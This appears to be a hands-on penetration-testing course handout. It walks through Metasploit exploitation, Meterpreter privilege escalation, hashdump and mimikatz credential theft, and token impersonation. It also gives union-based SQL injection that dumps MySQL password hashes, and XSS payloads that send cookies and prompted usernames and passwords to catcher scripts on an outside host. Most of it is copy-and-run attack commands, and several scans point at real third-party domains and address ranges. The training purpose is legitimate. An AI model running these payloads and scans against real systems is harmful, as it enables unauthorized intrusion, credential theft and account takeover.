+ls
+-----------------------------------------------------------------------
+ 
+       
+The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does
+not necessarily need to - have a shell or session started on a machine.
+ 
+The exploits directory has our modules that we need to pop a shell on a box.
+The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses
+like Burp Suite
+- Let's take a look at the external directory
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/external
+ls
+-----------------------------------------------------------------------
+ 
+- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/data
+ls
+-----------------------------------------------------------------------
+ 
+- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS
+brute-forcing
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/data/wordlists
+ls
+-----------------------------------------------------------------------
+ 
+- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter
+once a session is created.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/data/meterpreter
+ls
+-----------------------------------------------------------------------
+ 
+- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things
+like escalating privileges and dumping hashes.
+ 
+These are being phased out, though, and post-exploitation modules are what is being more preferred.
+The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll
+find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code
+for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our
+custom shellcode.
+ 
+The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have
+to do with other programs to make things like importing and exporting reports simple.
+Now that we have a clear understanding of what all of the different directories house, we can take a closer look at
+the exploits directory and get a better understanding of how the directory structure is there, so if we make our own
+modules we're going to have a better understanding of where everything needs to go.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules/exploits
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- The exploits directory is split up into several different directories, each one housing exploits for different types
+of systems. I.E. Windows, Unix, OSX, dialup and so on.
+Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down
+into categories of different types of services/programs, so that you can pick out an exploit specifically for the
+service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds
+for us.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules/auxiliary/
+ls
+-----------------------------------------------------------------------      
+ 
+ 
+- And a little further into the directory, let's take a look at what's in the scanner directory
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules/auxiliary/scanner/
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- And one more folder deeper into the structure, let's take a look in the portscan folder
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules/auxiliary/scanner/portscan
+ls
+-----------------------------------------------------------------------    
+ 
+- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open
+and report them back to us in a nice, easily readable format.
+ 
+cat tcp.rb
+   
+ 
+ 
+- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use
+once you have a session on a machine.
+Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit
+succeeds.
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/modules/payloads/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different
+application for it to be used as.
+Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you
+do everything once you have that shell calling back to you.
+Stagers are required for limited payload space so that the victim machine will call back to your attack box to get
+the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that
+much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used
+to download Stages payloads.
+ 
+ 
+- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind
+shells.
+---------------------------Type This-----------------------------------
+cd singles
+cd windows
+ls
+-----------------------------------------------------------------------
+ 
+ 
+- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and
+see what it actually does.
+---------------------------Type This-----------------------------------
+cat adduser.rb
+-----------------------------------------------------------------------
+ 
+Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give
+the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that
+it gives Windows to add the user to the system.
+ 
+ 
+- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a
+ 
+windows/shell/bind_tcp or windows/shell/reverse_tcp
+---------------------------Type This-----------------------------------
+cd ../../stagers
+ls
+-----------------------------------------------------------------------
+   
+ 
+ 
+- Again, we can see that we have stagers for multiple systems and code types.
+---------------------------Type This-----------------------------------
+ls windows/
+-----------------------------------------------------------------------    
+ 
+ 
+As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim
+machine, so we can upload or download our stage payloads and execute commands.
+Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with
+our stagers...
+---------------------------Type This-----------------------------------
+cd ../stages
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Again, we can see that our stages are coded for particular operating systems and languages.
+We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the
+victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run,
+if any.
+ 
+- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have
+already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens,
+so we can impersonate other users on the system in hopes of elevating our privileges.
+---------------------------Type This-----------------------------------
+cd ../../../post/
+ls
+cd windows/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all
+the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to
+escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as
+possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in
+memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.
+
+#################################
+# Getting start with MSFConsole #
+#################################
+
+---------------------------Type This-----------------------------------
+cd ~/metasploit-framework/
+
+./msfconsole
+----------------------------------------------------------------------
+
+
+ 
+##############################################
+# Run any Linux command inside of MSFConsole #
+##############################################
+
+Once you are inside of MSFConsole you want to do EVERYTHING 
+that you'd normally do in your Linux command shell in addition
+to running Metasploit commands.
+
+
+---------------------------Type This-----------------------------------
+ls
+ 
+pwd
+ 
+ping -c1 yahoo.com
+ 
+nmap yahoo.com
+----------------------------------------------------------------------
+ 
+ 
+ 
+
+- You're on the outside scanning publicly accessable targets.
+ 
+ 
+---------------------------Type This----------------------------------- 
+use auxiliary/scanner/portscan/tcp
+ 
+set RHOSTS 217.108.137.200
+ 
+set PORTS 80,1433,1521,3306,8000,8080,8081,10000                      
+ 
+run
+----------------------------------------------------------------------
+
+
+ 
+        - So let's do a quick google search for someone with trace.axd file
+        - filetye:axd inurl:trace.axd
+--------------------------Type This-----------------------------------
+use auxiliary/scanner/http/     (press the tab key, then press y to look through the http options)
+---------------------------------------------------------------------- 
+ 
+- Here is an example:
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/http/trace_axd
+ 
+set RHOSTS 207.20.57.112
+ 
+set VHOST www.motion-vr.net
+ 
+run
+---------------------------------------------------------------------- 
+
+ 
+
+
+---------------------------Type This----------------------------------- 
+use auxiliary/scanner/http/http_version                
+ 
+set RHOSTS 45.77.162.239
+ 
+set RPORT 80
+ 
+run
+---------------------------------------------------------------------- 
+ 
+
+---------------------------Type This----------------------------------- 
+use auxiliary/scanner/http/tomcat_enum                  
+ 
+set RHOSTS 217.108.137.200
+ 
+set RPORT 8080
+ 
+run
+-----------------------------------------------------------------------
+
+################################
+# Exploitation with Metasploit #
+################################
+Step 1: Disable the firewall on your Windows 10 host
+ 
+Step 2: Run your command prompt as an administrator
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+ 
+Step 3: Restart your computer (I'm sorry - I know this sux!)
+ 
+Step 4: Start the vulnerable server (no need to turn on OllyDBG)
+
+Step 5: From your CentoS run the following commands
+---------------------------Type This-----------------------------------
+cd ~/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
+ 
+unzip ExploitLab.zip
+ 
+cd ExploitLab/4-AttackScripts/
+ 
+vi vulnserv.rb
+ 
+cp vulnserv.rb ~/metasploit-framework/modules/exploits/windows/misc
+ 
+cd ~/metasploit-framework/
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST [CHANGEME-TO-YOUR-WIN10-IP]
+set RPORT 9999
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+ 
+********************************** Figure out who and where you are **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+ 
+meterpreter> run post/multi/manage/autoroute
+-----------------------------------------------------------------------
+ 
+ 
+********************************** Enumerate the host you are on **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter> use priv
+-----------------------------------------------------------------------
+ 
+ 
+--Option 1: GetSystem
+---------------------------Type This-----------------------------------
+meterpreter> getsystem
+-----------------------------------------------------------------------
+ 
+--Option 2:
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/escalate/getsystem
+-----------------------------------------------------------------------
+ 
+--Option 3:
+---------------------------Type This-----------------------------------
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 1234
+exploit
+-----------------------------------------------------------------------
+ 
+--Option 4:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 12345
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+--Option 5:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 5555
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+--Option 6:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 4567
+exploit
+-----------------------------------------------------------------------
+ 
+--Option 7:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 7777
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+--Option 8:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 7788
+exploit
+-----------------------------------------------------------------------
+ 
+--Option 9:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 7799
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+    A window will pop up and you need to click Yes in order to get your new meterpreter shell
+ 
+ 
+meterpreter > getuid
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter > getsystem
+...got system (via technique 1).
+ 
+ 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+-----------------------------------------------------------------------
+ 
+ 
+********************************** Steal Tokens **********************************
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+-----------------------------------------------------------------------
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+-----------------------------------------------------------------------
+
+
+###################################################
+# Day 4: Identifying External Security Mechanisms #
+###################################################
+ 
+ 
+ 
+###########################
+# Target IP Determination #
+###########################
+---------------------------Type This-----------------------------------
+cd ~/
+ 
+wget https://dl.packetstormsecurity.net/UNIX/scanners/blindcrawl.pl
+
+perl blindcrawl.pl -d motorola.com
+-----------------------------------------------------------------------
+ 
+ 
+-- Take each IP address and look ip up here:
+http://whois.domaintools.com/
+ 
+ 
+ 
+Zone Transfer fails on most domains, but here is an example of one that works:
+---------------------------Type This-----------------------------------
+dig axfr @nsztm1.digi.ninja zonetransfer.me
+ 
+ 
+cd ~/
+
+wget --no-check-certificate https://raw.githubusercontent.com/BenDrysdale/ipcrawl/master/ipcrawl.c
+ 
+gcc ipcrawl.c -o ipcrawl
+ 
+chmod 777 ipcrawl
+ 
+./ipcrawl 148.87.1.1 148.87.1.254              
+ 
+
+sudo nmap -sL 148.87.1.0-255
+ 
+  
+sudo nmap -sL 148.87.1.0-255 | grep oracle
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+###########################
+# Load Balancer Detection #
+###########################
+ 
+Here are some options to use for identifying load balancers:
+    - http://toolbar.netcraft.com/site_report
+    - https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/
+ 
+ 
+Here are some command-line options to use for identifying load balancers:
+---------------------------Type This-----------------------------------
+dig microsoft.com
+ 
+cd ~/
+
+wget https://raw.githubusercontent.com/craig/ge.mine.nu/master/lbd/lbd.sh
+
+chmod +x lbd.sh
+
+./lbd.sh microsoft.com
+
+git clone https://github.com/jmbr/halberd.git
+cd halberd/
+sudo python setup.py install
+cd ~
+
+ 
+halberd microsoft.com
+halberd motorola.com
+halberd oracle.com
+-----------------------------------------------------------------------
+ 
+ 
+######################################
+# Web Application Firewall Detection #
+######################################
+---------------------------Type This-----------------------------------
+
+sudo nmap -p 80 --script http-waf-detect.nse oracle.com
+ 
+ 
+sudo nmap -p 80 --script http-waf-detect.nse nsa.gov
+ 
+-----------------------------------------------------------------------
+ 
+ 
+########################
+# Scanning Methodology #
+########################
+ 
+- Ping Sweep
+What's alive?
+------------
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+    -if -SP yields no results try:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+    -Look for hostnames:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Port Scan
+What's where?
+------------
+---------------------------Type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Bannergrab/Version Query
+What versions of software are running
+-------------------------------------
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+https://packetstormsecurity.com/files/tags/exploit/
+
+
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 45.77.162.239
+ 
+ 
+
+ 
+Go to LAMP Target homepage
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/
+-------------------------------------------------------------------------------------
+ 
+ 
+Clicking on the Acer Link:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer
+-------------------------------------------------------------------------------------
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer'
+-------------------------------------------------------------------------------------  
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+-------------------------------------------------------------------------------------  
+ 
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+-------------------------------------------------------------------------------------
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-------------------------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+------------------------------------------------------------------------------------- -------------------
+ 
+ 
+ 
+ 
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+###############################################################################
+# What is XSS                                                                 #
+# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx            #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+    ---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+    -------------------------------------------------------------------------------------
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert('So this is XSS')</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert(document.cookie)</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+    -------------------------------------------------------------------------------------
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+   ---------------------------Paste this into Firefox-----------------------------------
+   http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+   -------------------------------------------------------------------------------------  
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+-------------------------------------------------------------------------------------  
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+Option 1
+--------
+---------------------------Paste this into Firefox-----------------------------------
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+Now view the stolen cookie at:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/passwords.html
+-------------------------------------------------------------------------------------  
+ 
+ 
+Option 2
+--------
+-------------------------Paste this into Firefox-----------------------------------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+ 
+ 
+Now view the stolen cookie at:
+http://45.63.104.73/xss_practice/username_password_logs.html
+ 
+ 
+ 
+ 
+#########################################
+# Let's try a local file include (LFI)  #
+#########################################
+- Here is an example of an LFI
+- Open this page in Firefox:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=contactus.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
+- Here you see a direct reference to a file on the local filesystem of the victim machine.
+- You can attack this by doing the following:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+-------------------------------------------------------------------------------------
+ 
+ 
+- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
+- somewhere else on the Internet. Here is an example of a text file on the web:
+-------------------------Paste this into Firefox-----------------------------------
+http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+- Now we can attack the target via RFI like this:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+
+
+
+
+####################
+# Day 5 Challenges #
+####################
+Challenge 1: Analyze this malware
+https://s3.amazonaws.com/infosecaddictsfiles/malware-password-is-infected.zip
+- Is it network aware
+- Does it modify the registry
+- Is it packed with a malware packer
+- Improve the script am.py from earlier in this pastebin so that it more effectively analyzes this file.
+- Improve the script mal_to_db.py earlier in this pastebin so that it more effectively stores data from the am.py analysis of this file.
+
+Challenge 2: Analyze and debug this exploit (answer the questions in this enclosed text file)
+https://s3.amazonaws.com/infosecaddictsfiles/SLmail5-5-quiz.zip
+
+Challenge 3: Perform a security assessment on this website
+http://demo.testfire.net 
+username: jsmith
+password: Demo1234
